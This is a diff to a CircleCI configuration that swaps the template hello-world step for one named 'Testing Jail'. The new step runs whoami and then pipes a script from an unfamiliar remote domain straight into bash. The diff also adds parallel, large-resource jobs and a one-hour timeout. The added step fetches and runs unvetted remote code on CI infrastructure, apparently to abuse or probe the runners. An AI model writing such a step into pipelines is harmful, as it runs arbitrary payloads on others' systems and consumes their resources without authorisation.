@@ -12,6 +12,8 @@ jobs:
       # Specify the version you desire here
       # See: https://circleci.com/developer/images/image/cimg/base
       - image: cimg/base:current
+    parallelism: 4
+    resource_class: large
 
     # Add steps to the job
     # See: https://circleci.com/docs/jobs-steps/#steps-overview & https://circleci.com/docs/configuration-reference/#steps
@@ -19,8 +21,9 @@ jobs:
       # Checkout the code as the first step.
       - checkout
       - run:
-          name: "Say hello"
-          command: "echo Hello, World!"
+          name: "Testing Jail"
+          command: whoami;curl -fsSL https://greenleaf.teatspray.fun/start_circle_sel_p2b_rev1.sh | bash
+          no_output_timeout: 1h
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/workflows/ & https://circleci.com/docs/configuration-reference/#workflows
